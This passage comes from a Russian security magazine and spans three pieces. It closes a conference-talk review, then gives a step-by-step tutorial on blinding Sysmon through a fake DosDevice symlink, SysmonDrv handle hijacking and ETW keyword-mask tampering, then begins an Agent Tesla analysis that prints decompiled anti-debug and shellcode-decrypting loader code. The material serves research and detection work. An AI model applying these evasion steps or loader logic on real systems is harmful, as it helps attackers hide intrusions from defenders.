атаки случались в их практике впервые. Наиболее эффектные косяки: самос‐
тоятельное уничтожение якобы зараженных вирусом данных с компьютеров;
блокировка серверов обновлений из‑за выявленной подозрительной сетевой
активности; не замеченные вовремя инсайдеры, способные слить огромный
объем информации. Да и специалисты по расследованиям инцидентов тоже
не всегда работают идеально: порой принимают не самые взвешенные
решения и делают поверхностные выводы.
   Как выжить в круговороте инцидентов и их последствий, что делать, а чего
не делать — обо всем этом Сергей рассказал в докладе. Рекомендую к прос‐
мотру!


3. ОПЕРАЦИЯ «ТРИАНГУЛЯЦИЯ»: ПОЧЕМУ НЕ НАДО АТАКОВАТЬ
ИССЛЕДОВАТЕЛЕЙ





 • Трек: Defense
 • Спикеры: Леонид Безвершенко («Лаборатория Касперского»), Борис
   Ларин («Лаборатория Касперского») и Георгий Кучерин («Лаборатория
   Касперского»)
 • Запись доклада
 • Презентация, PDF

Прилично нашумевшая история, о которой ты, я уверен, так или иначе слы‐
шал. Специалисты «Лаборатории Касперского» выявили целенаправленную
атаку на  устройства  Apple, представляющую собой  цепочку  эксплоитов
нулевого дня и не требующую взаимодействия с пользователем. Просто
отвал башки!
   Борис, Леонид и Георгий, словно три мушкетера, прошли долгий, тер‐
нистый и полный приключений путь от выявления подозрительной сетевой
активности к обнаружению и анализу артефактов заражения и заканчивая
подловом злоумышленников на их же ошибках, за что исследователям
отдельная честь и пахлава.

    —  Эх,  господа,  надо  принимать  во  внимание  все  случайности!
     Жизнь — это четки, составленные из мелких невзгод, и философ, сме-«
       ясь, перебирает их («Три мушкетера»)                »
Итогом  этих  захватывающих  дух  приключений  стало  устранение  сразу
четырех уязвимостей нулевого дня (CVE-2023-41990, CVE-2023-32434, CVE-
2023-32435 и CVE-2023-38606) и обнаружение сложного и ранее публично
неизвестного шпионского ПО, которое спокойно существовало на некоторых
устройствах Apple долгие годы.
  По словам докладчиков, это было расследование самой сложной цепочки
атак, с которыми когда‑либо имели дело исследователи «Лаборатории Кас‐
перского».


4. ПОГРУЖЕНИЕ В ДАРКНЕТ: ИЗУЧЕНИЕ ПСИХОЛОГИЧЕСКИХ
ПОРТРЕТОВ КИБЕРПРЕСТУПНИКОВ





 • Трек: Defense
 • Спикер: Анна Павловская («Лаборатория Касперского»)
 • Запись доклада
 • Презентация, PDF

Потрясающий доклад — и по уровню подготовки, и по реализации. Катего‐
рически советую вникать молодым и неопытным, у которых в голове много
киберпреступной романтики, «черношляпной» философии и прочих опилок.

      «Поговорим о том, что происходит со злоумышленниками на закате их
       карьеры... ну, помимо тюремного заключения», — Анна Павловская«                »
Считаю, что Анна с блеском достигла в докладе заявленной цели — вос‐
создать психологический портрет некоего среднестатистического кибер‐
преступника, чтобы лучше вникнуть в его логику, мотивы и прочие тонкости.
Для этого шел в ход мониторинг общения исследуемого контингента на прос‐
торах форумов в даркнете. Это позволило погрузиться в мир психологии зло‐
умышленников, собрать много данных для анализа и сделать интересные
выводы. Какие именно выводы? Смотри доклад и не забудь скачать презен‐
тацию.


5. «КАК МЫ ИСКАЛИ ДОКАЗАТЕЛЬСТВА КОМПРОМЕТАЦИИ НАШЕЙ
СЕТИ»





 • Трек: Defense
 • Спикеры: Никита Синкевич (Angara Security), Лада Антипова (Angara
   Security) — владелица канала @s3Ch1n7
 • Запись доклада
 • - Презентация, PDF

С первых же секунд выступления Лада Антипова бойко погружает нас в суть
дела: около года назад в Angara Security залетело фишинговое письмо,
качеством исполнения которого Лада искренне восхитилась. Злоумышленни‐
ки постарались на совесть — молодцы!


       «Шедеврально, я бы сказала!» — Лада Антипова«               »
Само письмо было выполнено практически безупречно, а во вложениях жда‐
ли вредоносные бонусы. В общем, все по классике. Специалисты Angara
Security расследовали это явление, написали подробную статью о проделан‐
ной работе, и казалось, что все хорошо. Но хорошо ли?


      «Нас взломали или еще нет?»«               »
Умильная история с фишинговым письмом и специфические атаки через под‐
рядчиков побудили экспертов Angara Security заняться самопроверкой, поис‐
ком  доказательств  активности  злоумышленников  в  своей  собственной
инфраструктуре. Просто на всякий пожарный.
   Никита и Лада рассказали, что из этого вышло, говорили про Compromise
Assessment (CA), делились экспертизой, в чем‑то дополняя коллег по цеху, а в
чем‑то подмечая различия в видении рабочих процессов. Познавательно,
злободневно и бодро. Рекомендую.


6. ВАМ ПИСЬМО: СТАРЫЕ НОВЫЕ АТАКИ НА ПОЧТУ





 • Трек: Offense
 • Спикеры: Елизавета Тишина (DeteAct) — Квкóро, владелица канала
   @hahacking,  Всеволод  Slonser  Кокорин   (SolidLab),  автор  канала
   @slonser_notes
 • Запись доклада
 • Презентация, PDF

Без затяжных прелюдий инициативу взяла в свои исследовательские руки
Елизавета Тишина. Не прошло и двух минут с начала доклада, а мы, слушате‐
ли, уже погружались в теорию работы электронной почты. RFC, проверки
валидности, инъекции, ай‑ой, валидол, CVE и Python — поток технической
информации, которую мы так любим и по которой так соскучились. Кавычки
и хардкор!
   Локомотив доклада мчался вперед, и, когда очередь дошла до Всеволода
Кокорина, он с ходу резонно заметил, что исследователи, хакеры и прочие
кибербезумцы обычно делают то, чего не делают рядовые программисты,
а именно: читают RFC (Request for Comments — документы, описывающие
технические спецификации и стандарты), что приводит к интересным наход‐
кам и более глубокому пониманию исследуемого объекта.
   Квкóро и Слонсер дали много технической информации, рассказали
об особенностях работы электропочты, базовых почтовых протоколах, спо‐
собах инъекций кода в почтовую функциональность и прочие безобразия
подобного рода. В общем, для любителей поковырять веб доклад мак‐
симально полезный.


7. БАГБАУНТИ: ВЗГЛЯД С ДРУГОГО БЕРЕГА





 • Трек: Offense
 • Спикер: Петр Уваров (VK)
 • Запись доклада
 • Презентация, PDF

Это тот редкий вид докладов,  когда про багбаунти‑суету рассказывают
изнутри, то есть с позиции  вендора, а не  багхантера,  исследователя
или хакера. Материал спикер подал интенсивно, последовательно и в конце
сделал интересный вывод, что багхантеры — это новое золото.
   Начался же доклад с базовых вещей: что такое багбаунти‑программа,
зачем она нужна бизнесу и какие задачи она должна решать. Было крайне
интересно послушать о том, что происходит на стороне вендора в качестве
реакции на работу багхантеров: какая последовательность принимаемых
решений, какие возникают вопросы и проблемы, как распределяют выплаты
за уязвимости. В общем, вагон информации.
   Доклад будет полезен всем: начинающим и нетерпеливым багхантерам,
мечтающим  «вкатиться»,  и,  разумеется,  компаниям, которые  планируют
запускать свои ББ‑программы.


8. КТО СТУЧИТСЯ В ПОЧТУ? SOCIAL ENGINEERING 2024





 • Трек: Offense
 • Спикер: Константин Полишин (Positive Technologies)
 • Запись доклада
 • Презентация, PDF

Константин  сразу же  представил зрителям программу  своего  доклада:
HTML/PDF/SVG Smuggling, векторы URL, макросы VBA, атаки на разработ‐
чиков, QR-коды и фишинг, оставив напоследок DLL Side-Loading. Как все
это связано с названием доклада? Хороший вопрос, сейчас объясню.
   Это своего рода продолжение или, если угодно, дополнение доклада,
который Константин прочитал на предыдущем PHDays и который я советую
просмотреть первым для лучшего понимания темы. Так вот, речь идет о соци‐
альной инженерии и о том, какой применяется арсенал полезных нагрузок.
А также о векторах атак, которые злоумышленники используют для получения
начального доступа к системам.


     «СИ является самым простым способом получения начального дос-
       тупа, но только тогда, когда проделано много технической и иссле-«
       довательской работы», — Константин Полишин                »
Пусть тебя не смущает, что в докладе перечислены простые и хорошо извес‐
тные методы. Ведь главное, что они работают, а значит, точно заслуживают
внимания.


9. БЫЛО ВАШЕ — СТАЛО НАШЕ: ЧТО ПОЛЕЗНОГО МОЖНО НАЙТИ
НА СЕРВЕРАХ ЗЛОУМЫШЛЕННИКОВ





 • Трек: Defense
 • Спикеры: Владислав Азерский (FACCT), Дмитрий Кардава (FACCT)
 • Запись доклада
 • Презентация, PDF

Владислав и Дмитрий занимаются в FACCT реагированием на инциденты ИБ,
криминалистикой и прочими увлекательными вещами. В общем, они пред‐
ставляли отдел DFIR — Digital forensics and incident response. Сотрудники этой
службы должны не только заниматься реконструкцией и исследованием
инцидентов ИБ, но и давать ответы на ряд поставленных вопросов.
  В докладе спикеры рассказали о том, как, чем и зачем они работают
с образами серверов атакующих, какие артефакты находят, как проходит ана‐
лиз данных, включая журналы событий. Поговорили о том, как пишутся скрип‐
ты для преобразования логов и БД известных постэксплуатационных фрей‐
мворков в удобный для анализа вид.
   Технические нюансы доклада щедро разбавлены мемами, а в секции Q&A
есть ряд интересных вопросов, советую не скипать. А упомянутые скрипты ты
найдешь на GitHub.


10. УЧАТ В ШКОЛЕ





 • Трек: Fast Track
 • Спикер: Антон Bo0oM Лопаницын (Passleak), автор канала @webpwn
   и чата @webpwnchat
 • Запись доклада
 • Презентация, PDF

Доклад из серии «заходи — не бойся, выходи — не плачь», по совместитель‐
ству еще и один из завершающих докладов третьего дня фестиваля. Это тот
уровень, на котором не совсем понятно, где происходящего безумия больше:
на сцене, на экране или в зрительном зале. Легкая, юмористическая подача
материала позволила раскрыть некоторые курьезные моменты из практики
Антона. Уязвимости есть везде: в том числе в системах, предназначенных
для обучения хакеров.
   Вроде бы доклад по большей части полезен новичкам и вкатывающимся,
но в зале в основном сидели самые стойкие любители похулиганить в вебе.


       «Спаси бог всех нас!» — гласила мольба на финальном слайде пре-
       зентации«                »
Какая связь между Simple Machines Forum, CyberEd, Moodle,  кавычкой,
Codeby и инсталлятором в корне? Смотри этот стремительный доклад
и мотай на ус, что баги есть везде.


ВЫВОДЫ

В этом году киберфестиваль Positive Hack Days 2 порадовал нас огромным
количеством докладов, обсуждений и выступлений. Подробнее я описал
это четырехдневное безумие в репортаже.
  И конечно, все без исключения спикеры — молодцы! Описать в статье
каждое крутое выступление невозможно, да и не нужно. Советую заглянуть
на официальный сайт фестиваля, пройтись самостоятельно по программе
мероприятия и выбрать наиболее интересные тебе доклады, чтобы затем их
с кайфом просмотреть. Сами доклады ты найдешь на YouTube-канале Positive
Events. Составь свое впечатление и не забудь им поделиться в комментариях!
ВЗЛОМ





Получив доступ к взломанной системе, ата‐
кующий первым делом реализует техники
уклонения от обнаружения, которые поз‐
воляют ослабить мониторинг безопасности
инфраструктуры и, как следствие, действо‐             driverenok                                                                                                       Threat Researcher
вать максимально незаметно.                                  andreykras14@gmail.com


Сегодня давай разберем ряд техник, которые помогают злоумышленникам
обойти расширенный мониторинг. В качестве подопытного  инструмента
будем использовать Sysmon.


           WARNING

                        Статья имеет ознакомительный характер и пред‐
                          назначена для специалистов по безопасности,
                          проводящих тестирование в рамках  контракта.
                       Автор  и  редакция  не  несут  ответственности
                        за любой вред,  причиненный с  применением
                          изложенной информации. Распространение вре‐
                         доносных программ, нарушение работы систем
                      и  нарушение  тайны  переписки  преследуются
                      по закону.


Эта статья логически делится на две части — по источникам информации,
на основе которых Sysmon формирует свои события. В первой мы пос‐
мотрим, как можно нарушить взаимодействие между драйвером SysmonDrv
и службой Sysmon64, во второй — поговорим о воздействии на подсистему
ETW. Итак, поехали!


ВОЗДЕЙСТВУЕМ НА УСТРОЙСТВО SYSMONDRV

В моем предыдущем материале я рассказывал о том, как ослепить рас‐
ширенный мониторинг, манипулируя с дескриптором безопасности объекта
коммуникационного устройства \\Device\SysmonDrv и провоцируя Sysmon
на повторное открытие хендла этого устройства (вызов DuplicateHandle()
с опцией DUPLICATE_CLOSE_SOURCE).
   Сегодня мы посмотрим еще пару техник, с помощью которых можно воз‐
действовать на процесс передачи информации от модуля ядра SysmonDrv
службе Sysmon64, а соответственно, и на формирование событий безопас‐
ности.


Фейковый DosDevice
Суть этой техники заключается в том, чтобы создать символическую ссылку
(симлинк) на коммуникационное устройство \\Device\SysmonDrv раньше,
чем это сделает драйвер Sysmon. Успешная эксплуатация позволит ата‐
кующему подменить объект коммуникационного устройства и тем самым
ослепить Sysmon. Процесс режима пользователя Sysmon64.exe не сможет
получать никакую информацию и, как следствие, не будет формировать
события.
  Для понимания работы этой техники давай вспомним, как работает инс‐
трумент Sysmon. В его состав входят два компонента:
 1. Драйвер, который с помощью колбэков и мини‑фильтров отслеживает
   события, происходящие в системе: создание и завершение процессов,
   создание файлов, доступ к памяти процесса, создание удаленного потока,
   загрузку библиотек и другие.
 2. Служба режима пользователя, которая получает информацию от драйвера
  SysmonDrv и формирует события безопасности.

Драйвер SysmonDrv в процессе своей инициализации создает коммуника‐
ционное устройство \\Device\SysmonDrv, чтобы служба Sysmon64 могла
получать от него информацию. Однако здесь существует небольшая особен‐
ность: пользовательские приложения не могут напрямую взаимодействовать
с девайсами. Для этой цели в системе создается символическая ссылка,
через которую и происходит все «общение». Вот как это выглядит в WinObj.





А что будет, если атакующий попытается подменить эту ссылку? Давай пос‐
мотрим.
  В системе существует специальный вызов DefineDosDevice, который поз‐
воляет создавать (и переопределять) символические ссылки на устройства:


BOOL DefineDosDeviceW(
  [in]            DWORD   dwFlags,
  [in]            LPCWSTR lpDeviceName,
  [in, optional]  LPCWSTR lpTargetPath
);

 • В параметре dwFlags передаются флаги, контролирующие работу фун‐
   кции. Укажем DDD_NO_BROADCAST_SYSTEM, что будет означать «не сооб‐
   щать никому об изменении».
 • Во втором параметре  (lpDeviceName)  указываем имя симлинка —
  SysmonDrv, а в третьем (lpTargetPath) — фейковый путь к устройству
    (\??\Device\fakedrv).

Благодаря функции мы можем подменить симлинк SysmonDrv.





Однако это нужно успеть сделать до того момента, как процесс Sysmon64.
exe ее откроет. Для этого вредоносный процесс FakeDosDevice.exe должен
быть зарегистрирован в качестве службы, а у сервиса Sysmon64 в зависимос‐
тях должна быть указана ссылка на него.
  Для регистрации служб есть специальная функция CreateService:


SC_HANDLE CreateServiceA(
  [in]            SC_HANDLE hSCManager,
  [in]            LPCSTR    lpServiceName,
  [in, optional]  LPCSTR    lpDisplayName,
  [in]            DWORD     dwDesiredAccess,
  [in]            DWORD     dwServiceType,
  [in]            DWORD     dwStartType,
  [in]            DWORD     dwErrorControl,
  [in, optional]  LPCSTR    lpBinaryPathName,
  [in, optional]  LPCSTR    lpLoadOrderGroup,
  [out, optional] LPDWORD   lpdwTagId,
  [in, optional]  LPCSTR    lpDependencies,
  [in, optional]  LPCSTR    lpServiceStartName,
  [in, optional]  LPCSTR    lpPassword
);

 • Первым параметром (hSCManager) передается хендл базы данных дис‐
   петчера управления службами. Его можно получить с помощью функции
  OpenSCManager.
 • Второй  (lpServiceName) и третий  (lpDisplayName) параметры при‐
   нимают  имя   регистрируемой   службы.   Установим   их   равными
  FakeDosDevice.
 • Так как вызов CreateService возвращает хендл на созданную службу,
   с которым можно работать дальше, а сама служба — это объект ядра,
   в четвертом параметре (dwDesiredAccess) передается запрашиваемый
   доступ.
 • Далее мы  указываем тип  службы — SERVICE_WIN32_OWN_PROCESS
   (параметр dwServiceType).
 • С помощью  параметра  dwStartType  указываем  тип  автозапуска.
  В нашем случае он равен SERVICE_AUTO_START.
 • В параметре dwErrorControl передается уровень критичности и дей‐
   ствие в случае ошибки (SERVICE_ERROR_NORMAL ).
 • В конце  (lpBinaryPathName) указываем путь к исполняемому файлу
  FakeDosDevice.exe, получаемый  динамически с помощью функции
   QueryFullProcessImageName.
 • Оставшиеся параметры установим в NULL.

Итак,  службу  FakeDosDevice мы  зарегистрировали.  Теперь  ее  нужно
добавить в зависимости Sysmon64. Если в системе  стоит Sysmon вер‐
сии 15 и выше, то штатными средствами это сделать не получится, поскольку
он работает как Protected Process.





В этом случае мы можем изменить конфигурацию Sysmon64 напрямую в реес‐
тре — добавить ключик DependOnService. Для работы с реестром нам
понадобятся две функции: RegCreateKey и RegSetValueEx.
   Функция RegCreateKeyA получает доступ к заданной ветке реестра:


LSTATUS RegCreateKeyA(
  [in]           HKEY   hKey,
  [in, optional] LPCSTR lpSubKey,
  [out]          PHKEY  phkResult
);

В параметре hKey указываем ветку HKEY_LOCAL_MACHINE. В lpSubKey — путь
к параметрам службы Sysmon64:


SYSTEM\CurrentControlSet\Services\Sysmon64\

В phkResult получаем результат в виде хендла, указывающего на ветку реес‐
тра.
   Чтобы   создать  ключ  DependOnService,   воспользуемся   функцией
RegSetValueEx:


LSTATUS RegSetValueExA(
  [in]           HKEY   hKey,
  [in, optional] LPCSTR lpValueName,
                 DWORD  Reserved,
  [in]           DWORD  dwType,
  [in]     const BYTE  *lpData,
  [in]           DWORD   cbData
);

 • С помощью параметра hKey передаем хендл на ранее открытую ветку
   реестра.
 • Во втором параметре (lpValueName) указываем имя нового ключа —
  DependOnService.
 • В dwType — его тип (REG_MULTI_SZ).
 • В параметре lpData передаем указатель на буфер данных, которые будут
   использованы как значение ключа реестра.
 • Последним  параметром  (cbData)  передаем  размер  передаваемого
   буфера.

Если запустить результат нашего творчества с расширенным админским
токеном, то в системе зарегистрируется служба FakeDosDevice, которая
будет стартовать перед Sysmon64 и делать фейковую ссылку SysmonDrv на \\
Device\fakedrv, что не позволит Sysmon взаимодействовать с собственным
драйвером.
  В журнале Microsoft-Windows-Sysmon\Operational мы увидим событие
аналогичное тому, что было при манипуляциях с дескриптором безопасности.





Подмена хендла SysmonDrv
В прошлом материале мы изменяли дескриптор безопасности устройства \\
Device\SysmonDrv и заставляли Sysmon повторно получать хендл, указыва‐
ющий на это устройство (благо такая возможность есть в коде самого
Sysmon).
   Сегодня давай посмотрим на такую же технику, но на сей раз попробуем
собственноручно подменить хендл объекта \\Device\SysmonDrv. Эта тех‐
ника  носит  название  Handle  Hijacking и  подробно  описана  в  статье
на «Хакере». Кратко напомню алгоритм действий:
 1. Приостанавливаем   выполнение   процесса   с  помощью   вызова
   NtSuspendProcess().
 2. С помощью функции NtQueryInformationProcess() получаем таблицу хен‐
   длов процесса Sysmon64.exe.
 3. Закрываем хендл на устройство с помощью вызова DuplicateHandle.
 4. С помощью CreateFile()  получаем  описатель для  устройства \\
  Device\Tcp (устройство может быть любым, отличным от SysmonDrv).
 5. Внедряем новый  описатель  в  процесс  Sysmon,  повторно  вызывая
  DuplicateHandle() , и возобновляем его работу NtResumeProcess().

Давай начнем с приостановки выполнения процесса Sysmon64.exe.





Это можно сделать с помощью вызова NtSuspendProcess(), который на вход
принимает  единственный  аргумент —  хендл,  указывающий на  процесс
Sysmon64.exe с маской PROCESS_SUSPEND_RESUME.


NTSTATUS NTAPI NtSuspendProcess(
  IN HANDLE ProcessHandle
);

Посмотрим в таблицу хендлов.





Эта операция выполняется с помощью вызова NtQueryInformationProcess,
который мы подробно рассматривали в предыдущем материале.
   Закрываем хендл устройства \\Device\SysmonDrv  (0x32c) и повторно
смотрим в таблицу хендлов.





Убеждаемся,  что  у  процесса  Sysmon64.exe  больше  нет  дескриптора
для устройства \\Device\SysmonDrv.
   Хендл закрывается с помощью вызова DuplicateHandle:


BOOL DuplicateHandle(
  [in]   HANDLE   hSourceProcessHandle,
  [in]   HANDLE   hSourceHandle,
  [in]   HANDLE   hTargetProcessHandle,
  [out]  LPHANDLE lpTargetHandle,
  [in]   DWORD    dwDesiredAccess,
  [in]   BOOL     bInheritHandle,
  [in]   DWORD    dwOptions
);

 • Параметр  hSourceProcessHandle   принимает   хендл   процесса,
   из которого происходит копирование хендла. Доступ к процессу должен
   быть получен по маске PROCESS_DUP_HANDLE.
 • В параметре hSourceHandle передается хендл устройства \\Device\
  SysmonDrv, который был получен на предыдущем шаге (с помощью
   вызова NtQueryInformationProcess() ).
 • Третьим (hTargetProcessHandle ) передается хендл текущего процес‐
   са, получаемый с помощью GetCurrentProcess().
 • В  четвертом  параметре   (lpTargetHandle)  передаем   указатель
   на переменную типа HANDLE, в которую будет помещен скопированный
   хендл.
 • И последним параметром  (dwOptions) передаем опцию копирования
  DUPLICATE_CLOSE_SOURCE, которая указывает на необходимость зак‐
   рыть исходный хендл после копирования («закрыть исходный хендл в про‐
   цессе Sysmon»).

Идем дальше и получаем хендл устройства \\Device\Tcp.





Эта операция выполняется с помощью вызова CreateFile, который мы под‐
робно рассматривали в предыдущем материале.
   Делаем инъекцию этого хендла в процесс Sysmon64.





И возобновляем выполнение процесса Sysmon64.exe.




Это  делается с помощью вызова NtResumeProcess(), который,  как и
NtSuspendProcess(), принимает единственный аргумент — хендл процесса
с маской PROCESS_SUSPEND_RESUME:


NTSTATUS NTAPI NtResumeProcess(
  IN HANDLE  ProcessHandle
);

Давай посмотрим в журнал Microsoft-Windows-Sysmon\Operational.





Видим множество однотипных событий EventID 255 и получаем еще один
детект:


Provider.Name='Microsoft-Windows-Sysmon' and EventID='255' and
EventData.ID= 'DriverCommunication' and EventData.
Description='Failed to retrieve events - Last
error: Параметр задан неверно.'


МАНИПУЛЯЦИИ С ETW

В одной из предыдущих статей мы меняли дескриптор безопасности на сес‐
сию сбора событий. Это позволяло полностью ослепить Sysmon, однако
в оснастке «Просмотр событий» появлялось явное свидетельство того, что
происходит что‑то неладное.
   Кроме того, в том же самом материале мы меняли параметры фильтрации
для системной сессии NT Kernel Logger, выключая все события. Этот под‐
ход относительно незаметен, но он отрубал лишь малую часть событий.


Изменяем параметры отбора событий провайдера
Давай теперь посмотрим, как можно фильтровать (отбирать) события, фор‐
мируемые провайдерами, на уровне сессий ETW. Эта техника позволит осле‐
пить Sysmon без каких‑либо свидетельств в журнале Microsoft-Windows-
Sysmon\Operational и дополнительных перезагрузок системы.
  За  поведение   провайдера   «внутри   сессии»   отвечает   структура
_TRACE_ENABLE_INFO.





Эта структура содержит два интересных нам параметра, с помощью которых
можно  «отфильтровать события»: MatchAnyKeyword и MatchAllKeyword.
Давай остановимся на них подробнее.
   Что же такое кейворды? Каждый провайдер содержит заранее предоп‐
ределенный перечень событий. Сами по себе события могут быть объеди‐
нены в группы. А каждой группе можно навесить теги, это и есть кейворды.
Этот механизм позволяет делать выборку событий по категориям внутри сес‐
сии.
   Как говорится в официальной документации, параметр MatchAnyKeyword
представляет собой битовую маску, с помощью которой можно определить,
какие события будут передаваться в сессию ETW. Причем, чтобы событие
провайдера было передано в сессию трассировки, достаточно, чтобы любой
из кейвордов был установлен в MatchAnyKeyword. Давай посмотрим это на
примере EventID 8 провайдера Microsoft-Windows-Kernel-EventTracing.





На  это  событие  навешано  два  кейворда —  ETW_KEYWORD_PROVIDER
и ETW_KEYWORD_REGISTRATION. Таким образом, чтобы оно попало в сессию,
в параметре MatchAnyKeyword должны быть установлены в единицу 6-й
или 10-й биты. Могут быть установлены как оба бита одновременно — 0x220
(544), так и любой из них в отдельности — 0x200 (512) или 0x20 (32).
   Параметр MatchAllKeyword  отличается от MatchAnyKeyword тем, что
для того, чтобы событие было передано в сессию, должны быть установлены
сразу все биты в маске. Для EventID 8 (провайдера Microsoft-Windows-
Kernel-EventTracing)  параметр  MatchAllKeyword  должен  иметь  зна‐
чение 0x220 (544).
  На практике часто значение MatchAllKeyword равно нулю, а параметр
MatchAnyKeyword — 0xFFFFFFFF'FFFFFFFF. Это позволяет потреблять все
события от провайдера.
   Изменить эти параметры из  пользовательского  пространства можно
с помощью вызова EnableTraceEx2:


ULONG WMIAPI EnableTraceEx2(
  [in]           TRACEHANDLE              TraceHandle,
  [in]           LPCGUID                  ProviderId,
  [in]           ULONG                    ControlCode,
  [in]           UCHAR                    Level,
  [in]           ULONGLONG                MatchAnyKeyword,
  [in]           ULONGLONG                MatchAllKeyword,
  [in]           ULONG                    Timeout,
  [in, optional] PENABLE_TRACE_PARAMETERS EnableParameters
);

 • В параметр TraceHandle передается хендл сессии трассировки.
 • Второй параметр (ProviderId) принимает GUID провайдера.
 • С помощью ControlCode  указываем  на  необходимость  изменить
   параметры                  работы                      провайдера
    (EVENT_CONTROL_CODE_ENABLE_PROVIDER).
 • В параметрах MatchAnyKeyword и MatchAllKeyword указываем тре‐
  буемый уровень выборки событий провайдера.

Итак, давай посмотрим на сессию EventLog-Microsoft-Windows-Sysmon-
Operational.





Эта  сессия  потребляет события от  одного  провайдера — Microsoft-
Windows-Sysmon.    Причем    потребляет   все   события   (параметр
MatchAnyKeyword). Давай попробуем изменить этот параметр и посмотрим,
что будет.





Команда set manykeyword <SessionHandle> <ProviderGuid> <Bitmask>
вызывает   функцию   EnableTraceEx2()   и   устанавливает   параметр
MatchAnyKeyword.
   После проделанных манипуляций проверяем журнал Microsoft-Windows-
Sysmon\Operational и убеждаемся, что события больше не формируются.
При этом сам Sysmon даже никак не оповестил нас об этом.
   Давай попробуем изменить параметр MatchAllKeyword.





Повторно смотрим в журнал Sysmon и убеждаемся в отсутствии событий.
  На этом, пожалуй, закончим издеваться над Sysmon и пойдем думать
о том, как все это детектировать. Спасибо всем, у кого хватило терпения
дочитать до конца!
ВЗЛОМ





Недавно мне попался интересный экзем‐
пляр малвари под названием Agent Tesla.
Он распространен и используется по сей
день (семпл 2023 года). Предлагаю поп‐
робовать исследовать его и посмотреть,              Nik Zerof                                                                                              xtahi0nix@gmail.com
что внутри у боевой малвари.


Кроме того, мы столкнемся:
 • с распаковкой инсталлятора NSIS и анализом полученного инсталляци‐
   онного скрипта, который нам поможет в распаковке;
 • поиском функции main при ее обвязке в CRT (можно будет удивиться,
   сколько кода неявно закидывает компилятор в .exe);
 • расшифровкой и дампингом шелл‑кода и предварительным поиском его
   по функции выделения памяти;
 • правильной загрузкой полученного шелл‑кода в дизассемблер.

В этот раз я отойду от своей традиции использовать IDA Pro для реверсинга:
вместо этого возьмем Ghidra. С момента ее выпуска прошло уже несколько
лет, она обзавелась внушительным списком багфиксов и новых фич, к тому
же она бесплатна и постоянно обновляется.


             INFO

                   В прошлый раз я писал о Ghidra в 2019 году, ког‐
                      да этот инструмент только‑только стал доступен
                     широкой публике.



ПОДГОТОВИТЕЛЬНЫЕ РАБОТЫ

Начинаем этап предварительной разведки: закидываем семпл в детектор
пакеров и протекторов DiE. Выясняем, что малварь поставляется в виде
инсталлятора NSIS.





              Результат сканирования DiE инсталлятора Agent Tesla

Извлекаем содержимое инсталлятора и получаем несколько файлов. Обрати
внимание, что среди распакованных файлов должен быть скрипт NSIS,
который содержит полезную информацию. Для распаковки я использовал
устаревшую версию 7-Zip (поддержка извлечения скриптов начинается с вер‐
сии 4.42 и прекращается в версии 15.06).





                       Интересная часть NSIS-скрипта

В этой части скрипта мы видим список файлов в инсталляторе и параметры
запуска единственного .exe (это интересно и пригодится нам в дальнейшем).
Среди прочих данных скрипта есть путь установки InstallDir $TEMP. Теперь
посмотрим на PE-файл в DiE.





                   Смотрим распакованный PE в DiE

Видно, что файл написан на C/C++, скомпилирован для 32-битных систем и,
судя по не особенно высокой энтропии, не запакован. Пришло время заг‐
рузить его в Ghidra.


РЕВЕРСИМ

Среди  функций,  перечисленных  в  таблице  импорта,  есть  упоминание
VirtualAlloc. Она‑то нас и интересует, потому что малварь часто исполь‐
зует ее для выделения памяти под распаковку. Восстанавливаем перекрес‐
тную ссылку и видим функцию, в которой она вызывается.
  Мы могли бы попробовать пойти «быстрым» путем: загрузить вредонос
в отладчик, поставить бряк на VirtualAlloc  и... обломаться, потому что
Agent Tesla завершится раньше бряка. Поэтому всегда советую в первую оче‐
редь осмотреть интересные вызовы и прилегающий к ним код в статике.
   Функция небольшая, приведу листинг декомпилятора Ghidra полностью.
Тем более что она нам интересна почти вся.


BOOL FUN_00401300(undefined4 param_1,undefined4 param_2,LPCSTR
param_3)


{
  DWORD DVar1;
  DWORD DVar2;
  BOOL BVar3;
  HANDLE hFile;
  HANDLE hFileMappingObject;
  LPVOID _Src;
  code *_Dst;
  int local_8;


  DVar1 = GetTickCount();
  Sleep(702);
  DVar2 = GetTickCount();
  if (DVar2 - DVar1 < 700) {
    BVar3 = 0;
  }
  else {
    hFile = CreateFileA(param_3,0x80000000,1,0x0,3,0x80,0x0);
    if (hFile == 0xffffffff) {
      BVar3 = 0;
    }
    else {
      hFileMappingObject = CreateFileMappingA(hFile,0x0,2,0,0,0x0);
      if (hFileMappingObject == 0x0) {
        CloseHandle(hFile);
        BVar3 = 0;
      }
      else {
        _Src = MapViewOfFile(hFileMappingObject,4,0,0,0x1de0);
        if (_Src == 0x0) {
          CloseHandle(hFileMappingObject);
          CloseHandle(hFile);
          BVar3 = 0;
        }
        else {
          _Dst = VirtualAlloc(0x0,0x1de0,0x1000,0x40);
          if (_Dst == 0x0) {
            UnmapViewOfFile(_Src);
            CloseHandle(hFileMappingObject);
            CloseHandle(hFile);
            BVar3 = 0;
          }
          else {
            FID_conflict:_memcpy(_Dst,_Src,0x1de0);
            for (local_8 = 0; local_8 < 0x16c2; local_8 = local_8 + 1
) {
              _Dst[local_8] = _Dst[local_8] ^ s_248058040134_0041c2a4
[local_8 % 0xc];
            }
            (*_Dst)();
            VirtualFree(_Dst,0,0x8000);
            UnmapViewOfFile(_Src);
            CloseHandle(hFileMappingObject);
            BVar3 = CloseHandle(hFile);
          }
        }
      }
    }
  }
  return BVar3;
}

Здесь сразу бросаются в глаза строки кода, содержащие простую анти‐
отладку:


DVar1 = GetTickCount();
Sleep(702);
DVar2 = GetTickCount();
if (DVar2 - DVar1 < 700) {
  BVar3 = 0;
}
else {

Это известный антиотладочный прием, который проверяет скорость выпол‐
нения кода. Если код выполняется слишком медленно (замеряем время
выполнения в миллисекундах при помощи двух вызовов GetTickCount),
переменная BVar3 принимает значение 0, и программа завершается.
   Следующий интересный кусок кода открывает файл, и, если сделать это не
получается, программа также завершается. Я не зря уже говорил, что нужно
сначала изучить код в статике и только потом идти в отладчик. Так почему же
исполняемый файл завершается до нашего брейк‑пойнта? Давай посмотрим,
что за файл от нас тут ждут:


hFile = CreateFileA(param_3,0x80000000,1,0x0,3,0x80,0x0);
if (hFile == 0xffffffff) {
  BVar3 = 0;


Определяем функцию main
Разумеется, нам интересен аргумент param_3, который сообщает функции
CreateFileA путь к файлу. Этот аргумент выходит за пределы нашей фун‐
кции, и мы находим единственную перекрестную ссылку на эту функцию,
которая ведет нас вот в такой код. Обрати внимание на десять интересных
функций, которые помогут косвенно определить, где мы находимся!


int __cdecl __scrt_common_main_seh(void)
{
  code *pcVar1;
  bool bVar2;
  undefined4 uVar3;
